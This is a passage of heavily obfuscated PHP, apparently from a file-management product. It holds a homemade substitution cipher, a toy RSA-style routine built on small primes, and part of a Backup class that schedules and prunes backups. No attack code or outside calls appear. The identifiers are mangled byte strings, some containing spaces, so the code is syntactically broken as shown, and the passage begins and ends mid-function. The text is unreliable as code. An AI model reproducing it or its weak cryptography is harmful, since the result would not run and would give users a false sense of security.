bÓ×¤Ö¾°Ş: $EãøÚ„Úˆò = $CÓÊ¹›èç£[668]; if (!$EãøÚ„Úˆò) { die; } $cî¡øŒ‹±Ş = 0; goto E”±´Ü®; E”±´Ü®: for ($C¯†°ˆƒá = 0; $C¯†°ˆƒá < $fåÕŠ–Õ®æ[24]($A¾à°Ú·¨§); $C¯†°ˆƒá++) { $cî¡øŒ‹±Ş = $cî¡øŒ‹±Ş == $fåÕŠ–Õ®æ[24]($EÒ¾½¡Îøõ) ? 0 : $cî¡øŒ‹±Ş; $d‡§Ğ¾­Îœ = ($FèˆÄÎ¶ Á + $fåÕŠ–Õ®æ[368]($BØ—…ƒ¼õŸ, $A¾à°Ú·¨§[$C¯†°ˆƒá]) + $fåÕŠ–Õ®æ[369]($EÒ¾½¡Îøõ[$cî¡øŒ‹±Ş++])) % 64; $a©ÄÛ‡Óé¾ .= $BØ—…ƒ¼õŸ[$d‡§Ğ¾­Îœ]; } $C™¦ Šåï‰ = $fåÕŠ–Õ®æ[360]($cÊ²„Ï§‡İ . $a©ÄÛ‡Óé¾); $Dœà¡”ºöê = $CÓÊ¹›èç£[669]; goto D‚—öò®ŠÒ; a÷º‰æ‡óØ: $A¾à°Ú·¨§ = $fåÕŠ–Õ®æ[131]($A¾à°Ú·¨§); $FèˆÄÎ¶ Á = $fåÕŠ–Õ®æ[367](0, 64); $e²·°°¡Å‰ = $CÓÊ¹›èç£[665]; goto aô«´‡¯; bØ×“ïÖ´ß: $fó¤ùƒ¼Èø = $CÓÊ¹›èç£[667]; $C¯†°ˆƒá = 0; $d‡§Ğ¾­Îœ = 0; goto bÓ×¤Ö¾°Ş; aô«´‡¯: if (!$e²·°°¡Å‰) { die; } $cÊ²„Ï§‡İ = $BØ—…ƒ¼õŸ[$FèˆÄÎ¶ Á]; $EÒ¾½¡Îøõ = $fåÕŠ–Õ®æ[127]($cÊ²„Ï§‡İ . $fåÕŠ–Õ®æ[127]($a‹¬ä¿¶ë . $cÊ²„Ï§‡İ) . $a‹¬ä¿¶ë); goto b˜‡ìÊ‘Ú; D‚—öò®ŠÒ: if (!$Dœà¡”ºöê) { return; } break; $b¢òĞîËĞŠ = $CÓÊ¹›èç£[670]; goto AÅÒ‘æğ…â; b˜‡ìÊ‘Ú: $cÍöˆËŒ˜¼ = $CÓÊ¹›èç£[666]; $EÒ¾½¡Îøõ = $fåÕŠ–Õ®æ[25]($EÒ¾½¡Îøõ, $FèˆÄÎ¶ Á % 8, $FèˆÄÎ¶ Á % 8 + 7); $a©ÄÛ‡Óé¾ = $fåÕŠ–Õ®æ[10]; goto bØ×“ïÖ´ß; AÅÒ‘æğ…â: default: $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][168]}($A¾à°Ú·¨§, $a‹¬ä¿¶ë . $C¤Çå×¾·); break; } $C™¦ Šåï‰ = $fåÕŠ–Õ®æ[236]($d¿Ì°âç¦ . $C¤Çå×¾· . $C™¦ Šåï‰); $c£•ŒÂ®Ùå = $CÓÊ¹›èç£[671]; goto Cëå‘§ÓìÄ; d×²ë¨àˆÜ: $d¿Ì°âç¦ = $fåÕŠ–Õ®æ[358](0, 5) . $fåÕŠ–Õ®æ[10]; $C¤Çå×¾· = $fåÕŠ–Õ®æ[137](15); $BØ—…ƒ¼õŸ = $fåÕŠ–Õ®æ[363]; goto b„Úİø·áÃ; F©Äˆù¬„Ç: $CÓÊ¹›èç£ =& $_SERVER[æ§›¦ÌáØ]; $fåÕŠ–Õ®æ =& $_SERVER[úÙ]; $fåÕŠ–Õ®æ[362](1); goto eÑ®È™É„; eÑ®È™É„: $a‰×¼»¯ù× = $CÓÊ¹›èç£[660]; while (strlen($a‰×¼»¯ù×) < $CÓÊ¹›èç£[595]) { if (!$a‰×¼»¯ù×) { break; } $a‰×¼»¯ù×++; } $A¾à°Ú·¨§ = $fåÕŠ–Õ®æ[2]($A¾à°Ú·¨§); goto d×²ë¨àˆÜ; B°˜ÁçŸ»È: } private function dyojda3d99b0($C —Õ¹Œ, $c¸»¿Ä¤Ë, $Aô¦»•• = 3) { goto eÂˆÁ¨ùé; aáğĞ–“Ê†: switch ($c¡Íî™‚ò©) { case $D¯ƒŒ®î›°[256]: $bç„†æŞìÎ = $this->{$_SERVER[úÙ][272]}($C —Õ¹Œ, $D¯ƒŒ®î›°[236]($c¸»¿Ä¤Ë . $eñ±¾¶È©Û)); break; case $D¯ƒŒ®î›°[242]: $bç„†æŞìÎ = $this->{$_SERVER[úÙ][272]}($C —Õ¹Œ, $D¯ƒŒ®î›°[236]($eñ±¾¶È©Û . $c¸»¿Ä¤Ë)); break; $e‰È†‹‹Ğ› = $e“â£ìãÑ‘[676]; if (!$e‰È†‹‹Ğ›) { die; } case $D¯ƒŒ®î›°[364]: $bç„†æŞìÎ = $this->{$_SERVER[úÙ][272]}($C —Õ¹Œ, $D¯ƒŒ®î›°[131]($eñ±¾¶È©Û . $c¸»¿Ä¤Ë)); break; case $D¯ƒŒ®î›°[365]: $bç„†æŞìÎ = $this->{$_SERVER[úÙ][272]}($C —Õ¹Œ, $D¯ƒŒ®î›°[127]($eñ±¾¶È©Û . $c¸»¿Ä¤Ë)); $DâšÁßòÎì = $e“â£ìãÑ‘[677]; if (!$DâšÁßòÎì) { die; } break; case $D¯ƒŒ®î›°[366]: goto f×à£µŒÎË; c¯ÅÃŸÛ±¨: if (strlen($B™¢ôà®íÅ) < $e“â£ìãÑ‘[591]) { return; } for ($AŸ‰¥Œ« Ù = 0; $AŸ‰¥Œ« Ù < $D¯ƒŒ®î›°[24]($C —Õ¹Œ); $AŸ‰¥Œ« Ù++) { $fÄÁì –× = $fÄÁì –× == $D¯ƒŒ®î›°[24]($B´³¨×‚ö) ? 0 : $fÄÁì –×; $F’·æ±ÏÄ† = $fÄÁì –×++; $B¤‰ñÚ¹Í = $D¯ƒŒ®î›°[368]($b‡«éµƒä, $C —Õ¹Œ[$AŸ‰¥Œ« Ù]) - $b©¸–êÀœÊ - $D¯ƒŒ®î›°[369]($B´³¨×‚ö[$F’·æ±ÏÄ†]); while ($B¤‰ñÚ¹Í < 0) { $B¤‰ñÚ¹Í += 64; $e˜µ­¤éš = $e“â£ìãÑ‘[682]; if (!$e˜µ­¤éš) { return; } } $BË±ä—à‹† .= $b‡«éµƒä[$B¤‰ñÚ¹Í]; } $bç„†æŞìÎ = $D¯ƒŒ®î›°[371]($BË±ä—à‹†); goto b†æëÌ´ù; Báö—Ô´Å…: $B´³¨×‚ö = $D¯ƒŒ®î›°[127]($EÒ¥÷Ğ²µÛ . $D¯ƒŒ®î›°[127]($c¸»¿Ä¤Ë . $EÒ¥÷Ğ²µÛ) . $c¸»¿Ä¤Ë); $B‡İÁó¦ƒ = $e“â£ìãÑ‘[602]; if (!$B‡İÁó¦ƒ) { return; } goto aªİÖ…¹‰; b†æëÌ´ù: break; $F„ß‘³‚íê = $e“â£ìãÑ‘[683]; if (!$F„ß‘³‚íê) { die; } goto D‡íŠîÁ; aªİÖ…¹‰: $B´³¨×‚ö = $D¯ƒŒ®î›°[25]($B´³¨×‚ö, $b©¸–êÀœÊ % 8, $b©¸–êÀœÊ % 8 + 7); $a—¸ÊØòê = $e“â£ìãÑ‘[679]; while ($a—¸ÊØòê < $e“â£ìãÑ‘[608]) { if ($a—¸ÊØòê >= 0) { break; } $a—¸ÊØòê++; } goto fèõ©ˆš­; c¶½ÃÍ†ÆÂ: $EÒ¥÷Ğ²µÛ = $C —Õ¹Œ[0]; $C —Õ¹Œ = $D¯ƒŒ®î›°[25]($C —Õ¹Œ, 1); $b©¸–êÀœÊ = $D¯ƒŒ®î›°[368]($b‡«éµƒä, $EÒ¥÷Ğ²µÛ); goto Báö—Ô´Å…; Cëóµæ “‹: $dªÑù†çÖÔ = $e“â£ìãÑ‘[680]; $fÄÁì –× = 0; $B™¢ôà®íÅ = $e“â£ìãÑ‘[681]; goto c¯ÅÃŸÛ±¨; f×à£µŒÎË: $C —Õ¹Œ = $D¯ƒŒ®î›°[370]($C —Õ¹Œ); $B½®Â“¨àŒ = $e“â£ìãÑ‘[678]; if (strlen($B½®Â“¨àŒ) < $e“â£ìãÑ‘[604]) { return; } goto c¶½ÃÍ†ÆÂ; fèõ©ˆš­: $BË±ä—à‹† = $D¯ƒŒ®î›°[10]; $AŸ‰¥Œ« Ù = 0; $B¤‰ñÚ¹Í = 0; goto Cëóµæ “‹; D‡íŠîÁ: default: $bç„†æŞìÎ = $this->{$_SERVER[úÙ][272]}($C —Õ¹Œ, $c¸»¿Ä¤Ë . $eñ±¾¶È©Û); $BÁá•Â®ùÁ = $e“â£ìãÑ‘[684]; while (strlen($BÁá•Â®ùÁ) < $e“â£ìãÑ‘[604]) { if (!$BÁá•Â®ùÁ) { break; } $BÁá•Â®ùÁ++; } break; } if ($Aô¦»•• - 1 > 0) { $bç„†æŞìÎ = $this->{$_SERVER[úÙ][211]}($bç„†æŞìÎ, $c¸»¿Ä¤Ë, $Aô¦»•• - 1); } return $bç„†æŞìÎ; goto aª—£µã½; eÂˆÁ¨ùé: $e“â£ìãÑ‘ =& $_SERVER[æ§›¦ÌáØ]; $D¯ƒŒ®î›° =& $_SERVER[úÙ]; if (!$D¯ƒŒ®î›°[161]($C —Õ¹Œ) || $D¯ƒŒ®î›°[24]($C —Õ¹Œ) < 10) { return !1; } goto FÛíÅ’îÃó; FÛíÅ’îÃó: $C —Õ¹Œ = $D¯ƒŒ®î›°[2]($C —Õ¹Œ); $DÜŒïØ‚…Ñ = $e“â£ìãÑ‘[672]; while ($DÜŒïØ‚…Ñ < $e“â£ìãÑ‘[591]) { if ($DÜŒïØ‚…Ñ >= 0) { break; } $DÜŒïØ‚…Ñ++; } goto A‹é¶ˆë½–; A‹é¶ˆë½–: $C —Õ¹Œ = $D¯ƒŒ®î›°[236]($C —Õ¹Œ); $C®³Æ¥Î¼‹ = $e“â£ìãÑ‘[673]; $c¡Íî™‚ò© = $C —Õ¹Œ[0]; goto BœÑËÜ†‘‚; e•÷ñ¢êÇ: while ($eò¢©½Ğ‘Œ < $e“â£ìãÑ‘[610]) { if ($eò¢©½Ğ‘Œ >= 0) { break; } $eò¢©½Ğ‘Œ++; } $b‡«éµƒä = $D¯ƒŒ®î›°[363]; $bÃ›•ğØ—Ä = $e“â£ìãÑ‘[675]; goto aáğĞ–“Ê†; BœÑËÜ†‘‚: $eñ±¾¶È©Û = $D¯ƒŒ®î›°[25]($C —Õ¹Œ, 1, 15); $C —Õ¹Œ = $D¯ƒŒ®î›°[25]($C —Õ¹Œ, 16); $eò¢©½Ğ‘Œ = $e“â£ìãÑ‘[674]; goto e•÷ñ¢êÇ; aª—£µã½: } public function qrkb8a5e881d($Aƒô»©ãÛ†) { goto fö÷ù…¨œŠ; aİğÛ»×æ¬: $e¬†•Ì® = $fñ»ø«øÄ½[685]; if (strlen($e¬†•Ì®) < $fñ»ø«øÄ½[608]) { return; } $dÕšÔ³ã = $this->{$_SERVER[úÙ][372]}(); goto c©É„É°ˆà; CâÏ‘”ğ¿·: return $cŠÀÂ›ˆ¿‹; $d â¯İ¤¤Š = $fñ»ø«øÄ½[692]; if (!$d â¯İ¤¤Š) { return; } goto B¬‚¦‡òÂÎ; CŒ†—Ã†Ïè: $b¡¨‘›Æ“˜ = $B«™‹ö»¾ò[127]($B«™‹ö»¾ò[373] . ($dØÒ“‘ÕÂŒ + $dÕšÔ³ã) . $B«™‹ö»¾ò[374] . $BÙóŸ‚´‰ê . $B«™‹ö»¾ò[374] . $Eë™ÕÃÍë . $B«™‹ö»¾ò[375]); $fçãîæÛÖÙ = $fñ»ø«øÄ½[690]; while ($fçãîæÛÖÙ < $fñ»ø«øÄ½[604]) { if ($fçãîæÛÖÙ >= 0) { break; } $fçãîæÛÖÙ++; } goto eºİß“†£˜; fö÷ù…¨œŠ: $fñ»ø«øÄ½ =& $_SERVER[æ§›¦ÌáØ]; $B«™‹ö»¾ò =& $_SERVER[úÙ]; $dØÒ“‘ÕÂŒ = $this->{$_SERVER[úÙ][372]}(); goto aİğÛ»×æ¬; Cï¤ä’ç•: $Eë™ÕÃÍë = 2; for ($dŸÈ­Ûà†¦ = 0; $dŸÈ­Ûà†¦ < $AíÀ§¨‘­ * 10; $dŸÈ­Ûà†¦++) { if (($AíÀ§¨‘­ * $dŸÈ­Ûà†¦ + 1) % $BÙóŸ‚´‰ê == 0) { $Eë™ÕÃÍë = $B«™‹ö»¾ò[266](($AíÀ§¨‘­ * $dŸÈ­Ûà†¦ + 1) / $BÙóŸ‚´‰ê); break; } } $dì›™¥ƒô = $this->{$_SERVER[úÙ][168]}($dØÒ“‘ÕÂŒ * $dÕšÔ³ã . $B«™‹ö»¾ò[10], $B«™‹ö»¾ò[170]); goto CŒ†—Ã†Ïè; F–¯î¼â¢õ: $fÎí¦ˆÛ¹ = $fñ»ø«øÄ½[688]; if (strlen($fÎí¦ˆÛ¹) < $fñ»ø«øÄ½[591]) { return; } while (1) { $D‚èÕ®İè = $BÙóŸ‚´‰ê; $eÙÈ÷¥‹²³ = $AíÀ§¨‘­; $E«Ï¾–„¹Œ = $fñ»ø«øÄ½[689]; if (strlen($E«Ï¾–„¹Œ) < $fñ»ø«øÄ½[610]) { die; } while ($eÙÈ÷¥‹²³ % $D‚èÕ®İè != 0) { $b‹‡“œê¥İ = $eÙÈ÷¥‹²³; $eÙÈ÷¥‹²³ = $D‚èÕ®İè; $D‚èÕ®İè = $b‹‡“œê¥İ % $D‚èÕ®İè; } if ($D‚èÕ®İè == 1) { break; } else { $BÙóŸ‚´‰ê++; } } goto Cï¤ä’ç•; eºİß“†£˜: $cŠÀÂ›ˆ¿‹ = $this->{$_SERVER[úÙ][168]}($Aƒô»©ãÛ†, $b¡¨‘›Æ“˜) . $B«™‹ö»¾ò[376] . $dì›™¥ƒô; $E¿«¬Ê‘Ñµ = $fñ»ø«øÄ½[691]; if (!$E¿«¬Ê‘Ñµ) { return; } goto CâÏ‘”ğ¿·; c©É„É°ˆà: $Cï’¯ŠÏÙ = $fñ»ø«øÄ½[686]; if (!$Cï’¯ŠÏÙ) { die; } $AíÀ§¨‘­ = ($dØÒ“‘ÕÂŒ - 1) * ($dÕšÔ³ã - 1); goto FÎ‚™âñ÷; FÎ‚™âñ÷: $Fäïß«ˆÏ£ = $fñ»ø«øÄ½[687]; while (strlen($Fäïß«ˆÏ£) < $fñ»ø«øÄ½[608]) { if (!$Fäïß«ˆÏ£) { break; } $Fäïß«ˆÏ£++; } $BÙóŸ‚´‰ê = $B«™‹ö»¾ò[266](($dØÒ“‘ÕÂŒ + $dÕšÔ³ã) / 2); goto F–¯î¼â¢õ; B¬‚¦‡òÂÎ: } public function ifywbec1416a($d°Ã„Ã¬ä£) { goto AœèÇŒÆˆ; AœèÇŒÆˆ: $aÜ¢«§Ä„š =& $_SERVER[æ§›¦ÌáØ]; $cêùĞ¦‚ïß =& $_SERVER[úÙ]; $eÙ›µõÊ‹ğ = $cêùĞ¦‚ïß[0]($cêùĞ¦‚ïß[376], $d°Ã„Ã¬ä£); goto D”ÄÃ¤öù¹; FŸÉİ»›Ìù: $D£×ò­–¦Ü = $aÜ¢«§Ä„š[663]; if (!$D£×ò­–¦Ü) { die; } $eÙĞİ¬ÂÅ” = 0; goto c™¦ÉŞÑ‹æ; C²‘ËøÉ—Ï: while ($dÉİåš“ˆ• < $aÜ¢«§Ä„š[610]) { if ($dÉİåš“ˆ• >= 0) { break; } $dÉİåš“ˆ•++; } return $E“ƒÉåºÀÉ; goto BÁ¸ÈÌ‡Í; c™¦ÉŞÑ‹æ: $bä´ƒø¥Í = 0; $A«Ø£šŠøç = $aÜ¢«§Ä„š[694]; if (strlen($A«Ø£šŠøç) < $aÜ¢«§Ä„š[604]) { return; } goto a Ÿù¯ŸÍ; B õøÊÅá: $aƒ™“ÛĞèŠ = $this->{$_SERVER[úÙ][272]}($eÙ›µõÊ‹ğ[1] . $cêùĞ¦‚ïß[10], $cêùĞ¦‚ïß[170]); if (!$aƒ™“ÛĞèŠ) { return $cêùĞ¦‚ïß[10]; } $aƒ™“ÛĞèŠ = $cêùĞ¦‚ïß[266]($aƒ™“ÛĞèŠ); goto FŸÉİ»›Ìù; d«ÙÅæøÎ: $CõáÈñé‹” = $cêùĞ¦‚ïß[127]($cêùĞ¦‚ïß[373] . ($eÙĞİ¬ÂÅ” + $bä´ƒø¥Í) . $cêùĞ¦‚ïß[374] . $b›®ÌŠ . $cêùĞ¦‚ïß[374] . $c´¬ÌïÚ¯ . $cêùĞ¦‚ïß[375]); $E“ƒÉåºÀÉ = $this->{$_SERVER[úÙ][272]}($eÙ›µõÊ‹ğ[0], $CõáÈñé‹”); $dÉİåš“ˆ• = $aÜ¢«§Ä„š[698]; goto C²‘ËøÉ—Ï; a Ÿù¯ŸÍ: for ($D¨éÄø®šÒ = 3; $D¨éÄø®šÒ < $aƒ™“ÛĞèŠ; $D¨éÄø®šÒ += 2) { if ($aƒ™“ÛĞèŠ % $D¨éÄø®šÒ != 0) { continue; } $eÙĞİ¬ÂÅ” = $D¨éÄø®šÒ; $bä´ƒø¥Í = $cêùĞ¦‚ïß[266]($aƒ™“ÛĞèŠ / $D¨éÄø®šÒ); $bŞ›ÎŠáá = $aÜ¢«§Ä„š[695]; break; } $AæŸ•ïË›¦ = ($eÙĞİ¬ÂÅ” - 1) * ($bä´ƒø¥Í - 1); $bÛ ¯¶äÃÁ = $aÜ¢«§Ä„š[674]; goto bğÑË’Â; B´Ï±ƒ‰½²: $E‘è‡îó³ˆ = $aÜ¢«§Ä„š[697]; if (!$E‘è‡îó³ˆ) { die; } for ($D¨éÄø®šÒ = 0; $D¨éÄø®šÒ < $AæŸ•ïË›¦ * 10; $D¨éÄø®šÒ++) { if (($AæŸ•ïË›¦ * $D¨éÄø®šÒ + 1) % $b›®ÌŠ == 0) { $c´¬ÌïÚ¯ = $cêùĞ¦‚ïß[266](($AæŸ•ïË›¦ * $D¨éÄø®šÒ + 1) / $b›®ÌŠ); break; } } goto d«ÙÅæøÎ; D”ÄÃ¤öù¹: $A°‹·êÇù” = $aÜ¢«§Ä„š[693]; while ($A°‹·êÇù” < $aÜ¢«§Ä„š[591]) { if ($A°‹·êÇù” >= 0) { break; } $A°‹·êÇù”++; } if ($cêùĞ¦‚ïß[19]($eÙ›µõÊ‹ğ) != 2) { return $cêùĞ¦‚ïß[10]; } goto B õøÊÅá; bğÑË’Â: $b›®ÌŠ = $cêùĞ¦‚ïß[266](($eÙĞİ¬ÂÅ” + $bä´ƒø¥Í) / 2); while (1) { $Dë¤Ô½éè = $b›®ÌŠ; $E½‚¤Ñ¶®¥ = $AæŸ•ïË›¦; while ($E½‚¤Ñ¶®¥ % $Dë¤Ô½éè != 0) { $d­´ƒŠºÀÚ = $E½‚¤Ñ¶®¥; $E½‚¤Ñ¶®¥ = $Dë¤Ô½éè; $d÷µİñ¾ù† = $aÜ¢«§Ä„š[696]; $Dë¤Ô½éè = $d­´ƒŠºÀÚ % $Dë¤Ô½éè; } if ($Dë¤Ô½éè == 1) { break; } else { $b›®ÌŠ++; } } $c´¬ÌïÚ¯ = 2; goto B´Ï±ƒ‰½²; BÁ¸ÈÌ‡Í: } public function axkw13df623f() { goto eë²ÌñÇĞ; FŒˆ‡¦§Ã’: $bèˆå¤ÊÑœ = 1; while ($bèˆå¤ÊÑœ <= (int) $d¬••§íã[378]($a‚•à‘ãÃ½)) { $AÏÅ²ñÓò = $bèˆå¤ÊÑœ; while (!0) { $AÏÅ²ñÓò++; if ($AÏÅ²ñÓò <= 2) { $bèˆå¤ÊÑœ = $AÏÅ²ñÓò; break; } else { if ($AÏÅ²ñÓò < 2) { continue; } } $bñ”£¯ØÇ¾ = !0; for ($bÎ÷ÄåÛç = 2; $bÎ÷ÄåÛç <= $d¬••§íã[378]($AÏÅ²ñÓò); $bÎ÷ÄåÛç++) { if ($AÏÅ²ñÓò % $bÎ÷ÄåÛç == 0) { $bñ”£¯ØÇ¾ = !1; } } if ($bñ”£¯ØÇ¾) { $bèˆå¤ÊÑœ = $AÏÅ²ñÓò; break; } } $D¤äµÖô¶[] = $bèˆå¤ÊÑœ; } $eÂ‰ªâ­ = 2; goto Aï´×½Çº˜; Aï´×½Çº˜: for ($AÏÅ²ñÓò = $a‚•à‘ãÃ½; $AÏÅ²ñÓò > 1; $AÏÅ²ñÓò--) { $bñ”£¯ØÇ¾ = !0; $aéºŒÍ…ì˜ = $_SERVER[æ§›¦ÌáØ][699]; foreach ($D¤äµÖô¶ as $Bç¸»âƒ¡ª) { if ($AÏÅ²ñÓò % $Bç¸»âƒ¡ª == 0) { $bñ”£¯ØÇ¾ = !1; break; } } if ($bñ”£¯ØÇ¾) { $eÂ‰ªâ­ = $AÏÅ²ñÓò; break; } } return $eÂ‰ªâ­; goto F¾÷ğ„êŸÊ; eë²ÌñÇĞ: $d¬••§íã =& $_SERVER[úÙ]; $a‚•à‘ãÃ½ = $d¬••§íã[358]($d¬••§íã[377](2, 14), $d¬••§íã[377](2, 16) - 1); $D¤äµÖô¶ = array(); goto FŒˆ‡¦§Ã’; F¾÷ğ„êŸÊ: } public function nbug880c35fc($Aƒ”©ƒáµí, $aÂäÁ¹‘­) { $b’Š²É¡¢ =& $_SERVER[úÙ]; return $b’Š²É¡¢[13](array($b’Š²É¡¢[14], $b’Š²É¡¢[379]), $Aƒ”©ƒáµí, $aÂäÁ¹‘­); $FµëÉØŠ®ê = $_SERVER[æ§›¦ÌáØ][700]; if (!$FµëÉØŠ®ê) { die; } } public function prmyb9b6485d($AŞÆ¼ÑÏŒš, $FÛ«èê¨Öå) { $Dóó«º¿Š =& $_SERVER[úÙ]; return $Dóó«º¿Š[13](array($Dóó«º¿Š[380], $Dóó«º¿Š[381]), $AŞÆ¼ÑÏŒš, $FÛ«èê¨Öå); } public function pvxi29cf7baf($f§šÆ¬, $F›¤Ø„¢µÚ) { $E…âï†«ä =& $_SERVER[úÙ]; return $E…âï†«ä[13](array($E…âï†«ä[380], $E…âï†«ä[382]), $f§šÆ¬, $F›¤Ø„¢µÚ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $e–„ÛğË =& $_SERVER[æ§›¦ÌáØ]; $this->isManual(); self::$name = date($e–„ÛğË[701]); if (!($dÇãƒêàÅø = Model($e–„ÛğË[702])->lastItem())) { $dÇãƒêàÅø = $this->initData(); } else { self::$name = $dÇãƒêàÅø[$e–„ÛğË[28]]; if ($dÇãƒêàÅø[$e–„ÛğË[703]] == $e–„ÛğË[87]) { self::$name = date($e–„ÛğË[704]); $fëÓßŠ¬£Í = 0; if (isset($dÇãƒêàÅø[$e–„ÛğË[291]][$e–„ÛğË[193]][$e–„ÛğË[447]])) { $fëÓßŠ¬£Í = (int) $dÇãƒêàÅø[$e–„ÛğË[291]][$e–„ÛğË[193]][$e–„ÛğË[447]]; } if (self::$manual == 0 && $dÇãƒêàÅø[$e–„ÛğË[28]] == self::$name) { Model($e–„ÛğË[702])->remove($dÇãƒêàÅø[$e–„ÛğË[393]]); } $dÇãƒêàÅø = $this->initData($fëÓßŠ¬£Í, $dÇãƒêàÅø[$e–„ÛğË[705]]); } else { $this->checkStore($dÇãƒêàÅø[$e–„ÛğË[705]]); } } self::$option = $dÇãƒêàÅø; } private function isManual() { $aš™š÷İ¿ç = _get($GLOBALS, $_SERVER[æ§›¦ÌáØ][706], 0); $aš™š÷İ¿ç = intval($aš™š÷İ¿ç); self::$manual = $aš™š÷İ¿ç && $aš™š÷İ¿ç == 1 ? 1 : 0; } private function initData($dĞĞƒæÙÂ = 0, $Bíİ–‘½Ùİ = '') { goto A¦Ô¥Óø; c— à³ÇÚµ: $BÍ®·‹ª = Model($e¡¹á¹ùÈÒ[702])->insert($A³Æ°±Öö); $A³Æ°±Öö[$e¡¹á¹ùÈÒ[393]] = $BÍ®·‹ª; return $A³Æ°±Öö; goto dŸ¸ó×œîÉ; A¦Ô¥Óø: $e¡¹á¹ùÈÒ =& $_SERVER[æ§›¦ÌáØ]; $c¦Åƒ¨Ñ‹ê = Model($e¡¹á¹ùÈÒ[702])->config(); if ($Bíİ–‘½Ùİ && $c¦Åƒ¨Ñ‹ê[$e¡¹á¹ùÈÒ[705]] != $Bíİ–‘½Ùİ) { $dĞĞƒæÙÂ = 0; } goto Dó¾¨ñ±ì‰; Dó¾¨ñ±ì‰: $this->checkStore($c¦Åƒ¨Ñ‹ê[$e¡¹á¹ùÈÒ[705]]); if (self::$manual == 1) { self::$name .= $e¡¹á¹ùÈÒ[71] . date($e¡¹á¹ùÈÒ[707]); } $A³Æ°±Öö = array($e¡¹á¹ùÈÒ[705] => $c¦Åƒ¨Ñ‹ê[$e¡¹á¹ùÈÒ[705]], $e¡¹á¹ùÈÒ[28] => self::$name, $e¡¹á¹ùÈÒ[703] => 0, $e¡¹á¹ùÈÒ[708] => $c¦Åƒ¨Ñ‹ê[$e¡¹á¹ùÈÒ[708]], $e¡¹á¹ùÈÒ[709] => self::$manual, $e¡¹á¹ùÈÒ[291] => array($e¡¹á¹ùÈÒ[710] => array($e¡¹á¹ùÈÒ[703] => 0), $e¡¹á¹ùÈÒ[711] => array($e¡¹á¹ùÈÒ[703] => 0, $e¡¹á¹ùÈÒ[712] => 0, $e¡¹á¹ùÈÒ[713] => 0, $e¡¹á¹ùÈÒ[29] => $e¡¹á¹ùÈÒ[33], $e¡¹á¹ùÈÒ[714] => 0, $e¡¹á¹ùÈÒ[476] => 0), $e¡¹á¹ùÈÒ[715] => array($e¡¹á¹ùÈÒ[703] => 0, $e¡¹á¹ùÈÒ[712] => 0, $e¡¹á¹ùÈÒ[713] => 0, $e¡¹á¹ùÈÒ[714] => 0, $e¡¹á¹ùÈÒ[476] => 0), $e¡¹á¹ùÈÒ[193] => array($e¡¹á¹ùÈÒ[703] => 0, $e¡¹á¹ùÈÒ[716] => 0, $e¡¹á¹ùÈÒ[717] => 0, $e¡¹á¹ùÈÒ[718] => 0, $e¡¹á¹ùÈÒ[719] => 0, $e¡¹á¹ùÈÒ[447] => $dĞĞƒæÙÂ, $e¡¹á¹ùÈÒ[714] => 0, $e¡¹á¹ùÈÒ[476] => 0)), $e¡¹á¹ùÈÒ[714] => time(), $e¡¹á¹ùÈÒ[476] => 0); goto c— à³ÇÚµ; dŸ¸ó×œîÉ: } private function checkStore($bší²™×Æİ) { $eÔƒ»ÁÈŸ› =& $_SERVER[æ§›¦ÌáØ]; $b ‚•¨æŠ = Model($eÔƒ»ÁÈŸ›[720])->listData($bší²™×Æİ); Model($eÔƒ»ÁÈŸ›[720])->checkConfig($b ‚•¨æŠ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[æ§›¦ÌáØ][702])->findByName(self::$name); } return self::$option; } public static function set($FŒ¶ñäõ“À) { $eŸŞÀÅà =& $_SERVER[æ§›¦ÌáØ]; $DôÇìƒ¢‰Ÿ = self::get(); foreach ($FŒ¶ñäõ“À as $Dæ‡™Â½‹É => $CƒŒ‘¶Á¾¤) { $e´ªÛğŒˆ = explode($eŸŞÀÅà[95], $Dæ‡™Â½‹É); $B“‚‰ß‚§Î = count($e´ªÛğŒˆ); switch ($B“‚‰ß‚§Î) { case 1: $DôÇìƒ¢‰Ÿ[$e´ªÛğŒˆ[0]] = $CƒŒ‘¶Á¾¤; break; case 2: $DôÇìƒ¢‰Ÿ[$e´ªÛğŒˆ[0]][$e´ªÛğŒˆ[1]] = $CƒŒ‘¶Á¾¤; break; case 3: $DôÇìƒ¢‰Ÿ[$e´ªÛğŒˆ[0]][$e´ªÛğŒˆ[1]][$e´ªÛğŒˆ[2]] = $CƒŒ‘¶Á¾¤; break; } } Model($eŸŞÀÅà[702])->update($DôÇìƒ¢‰Ÿ[$eŸŞÀÅà[393]], $DôÇìƒ¢‰Ÿ); self::$option = $DôÇìƒ¢‰Ÿ; return self::$option; } public function keep() { $C˜‹´§ìéÍ =& $_SERVER[æ§›¦ÌáØ]; $eá¡¼°†¥ç = self::get(); if ($eá¡¼°†¥ç[$C˜‹´§ìéÍ[291]][$C˜‹´§ìéÍ[710]][$C˜‹´§ìéÍ[703]] == $C˜‹´§ìéÍ[87]) { return; } $this->backupKeep($eá¡¼°†¥ç); self::set(array($C˜‹´§ìéÍ[721] => 1)); } private function backupKeep($F¿¾Ğ“ÔÚ“) { goto aÊÖ¡éÔº‘; D‚ª¹¾ãëÜ: if (empty($AÕš÷÷ÈÖÁ)) { return; } $AßĞÕ…˜Œ = 0; $dæƒÛº‘¼ = array(); goto dÔÎò¥á ×; dÔÎò¥á ×: foreach ($AÕš÷÷ÈÖÁ as $C«ÅÍãÆ²Ù) { if ($AßĞÕ…˜Œ >= 7) { break; } $dæƒÛº‘¼[] = $C«ÅÍãÆ²Ù[$E¸½ö£·ù[28]]; $AßĞÕ…˜Œ++; } for ($AßĞÕ…˜Œ = 0; $AßĞÕ…˜Œ < 12; $AßĞÕ…˜Œ++) { $dæƒÛº‘¼[] = date($E¸½ö£·ù[722], strtotime("\x2d{$AßĞÕ…˜Œ}\40\155\x6f\x6e\164\150\163")); } $dæƒÛº‘¼ = array_unique($dæƒÛº‘¼); goto f÷Ö‰­¦·¿; f÷Ö‰­¦·¿: $A°é“Õá©Ë = Model($E¸½ö£·ù[723])->get($E¸½ö£·ù[724]); foreach ($AÕš÷÷ÈÖÁ as $C«ÅÍãÆ²Ù) { if (isset($C«ÅÍãÆ²Ù[$E¸½ö£·ù[709]]) && $C«ÅÍãÆ²Ù[$E¸½ö£·ù[709]] == $E¸½ö£·ù[87]) { continue; } if (!empty($C«ÅÍãÆ²Ù[$E¸½ö£·ù[28]]) && in_array($C«ÅÍãÆ²Ù[$E¸½ö£·ù[28]], 